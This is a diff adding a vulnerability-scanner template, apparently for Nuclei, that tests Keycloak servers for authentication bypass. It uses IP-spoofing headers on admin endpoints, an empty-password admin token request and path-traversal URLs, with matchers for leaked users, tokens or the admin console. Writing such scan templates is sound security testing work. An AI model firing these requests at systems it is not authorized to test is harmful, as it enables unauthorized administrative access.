@@ -1,0 +1,85 @@
+# Keycloak Authentication Bypass
+# Tests for common authentication bypass vulnerabilities
+
+id: keycloak-authentication-bypass
+
+info:
+  name: Keycloak Authentication Bypass
+  author: H1/rfs85
+  severity: high
+  description: Tests for authentication bypass vulnerabilities in Keycloak
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=keycloak
+  tags: keycloak,authentication,bypass,vulnerability
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/admin/realms/master/users"
+      - "{{BaseURL}}/admin/realms/master/users"
+      - "{{BaseURL}}/auth/admin/realms/master"
+      - "{{BaseURL}}/admin/realms/master"
+      - "{{BaseURL}}/auth/admin/"
+      - "{{BaseURL}}/admin/"
+
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+      X-Real-IP: "127.0.0.1"
+      X-Originating-IP: "127.0.0.1"
+      X-Remote-IP: "127.0.0.1"
+      X-Client-IP: "127.0.0.1"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"username\""
+          - "\"email\""
+          - "Administration Console"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/token"
+      - "{{BaseURL}}/realms/master/protocol/openid-connect/token"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      grant_type=password&client_id=admin-cli&username=admin&password=
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "access_token"
+          - "token_type"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/admin/../admin/"
+      - "{{BaseURL}}/auth/admin/%2e%2e/admin/"
+      - "{{BaseURL}}/auth/admin/..%2fadmin/"
+      - "{{BaseURL}}/auth/admin/..%5cadmin/"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Administration Console"
+          - "Keycloak"
+        condition: and
+
+      - type: status
+        status:
+          - 200
